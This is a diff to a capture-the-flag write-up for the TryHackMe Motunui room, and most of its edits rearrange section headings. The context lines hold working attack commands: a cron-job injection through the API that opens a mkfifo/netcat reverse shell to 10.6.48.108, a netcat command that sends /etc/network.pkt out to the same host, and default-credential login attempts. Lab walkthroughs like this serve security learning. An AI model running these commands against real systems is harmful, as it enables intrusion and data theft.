@@ -1,8 +1,6 @@
 ## Table of contents
 - Port Scan - Service discovery
-- searching service version exploits
 - Pentesting services
-- Brute forcing services
 - Getting a Shell
 - Inside
 - Exciltration
@@ -332,7 +330,7 @@ curl http://d3v3lopm3nt.motunui.thm/docs/ROUTES.md
     {
     	"error": "you are unauthorised to view this resource"
     }
-    ```
+	```
 
 ### Changing /etc/hosts file again
 
@@ -349,6 +347,8 @@ curl -H 'Content-Type: application/json' -d '{"username":"admin","password":"adm
 curl http://api.motunui.thm:3000/v1/login
     
     {"message":"please get maui to update these routes"}
+
+### Pentesting services
 
 ## Bruteforcing user maui:island
 
@@ -380,6 +380,8 @@ curl -H 'Content-Type: application/json' -d '{"username":"maui","password":"isla
     
     {"hash":"aXNsYW5k"}
 
+### Getting a Shell
+
 ## Reverse shell
 
 curl -H 'Content-Type: application/json' -d '{"hash":"aXNsYW5k","job":"* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.48.108 4050 >/tmp/f"}' -XPOST http://api.motunui.thm:3000/v2/jobs 
@@ -400,6 +402,8 @@ nc -lvnp 4050
     stty raw -echo
     fg
     export TERM=xterm
+
+### Inside
 
 ## enumerating files and directories
 
@@ -433,11 +437,13 @@ find / -type f -iname '*pkt' -ls 2>/dev/null
 
        926350     76 -rwxrwxrwx   1 moana    moana       75918 Jul  9  2020 /etc/network.pkt
 
-### Sender
+### Exciltration
+
+## Sender
 
 cat /etc/network.pkt | nc 10.6.48.108 4545
 
-### 
+## 
 
 nc -lvnp 4545 > network.pkt
 
@@ -462,6 +468,8 @@ nc -lvnp 4545 > network.pkt
     !
     interface FastEthernet0/1
      --More-- 
+
+### Privilege escelation
 
 ## we can login via ssh and retrieve the first flag
 ──(mrblue㉿kali)-[~/CTF/THM/Motunui]
@@ -489,6 +497,8 @@ nc -lvnp 4545 > network.pkt
     RestartSec=5
     [Install]
     WantedBy=multi-user.target
+
+### Privilege escelation
 
 ## We find in /etc/ssl.txt, with this we can fully decrypt the traffic of the wireshark pcap file we had
 
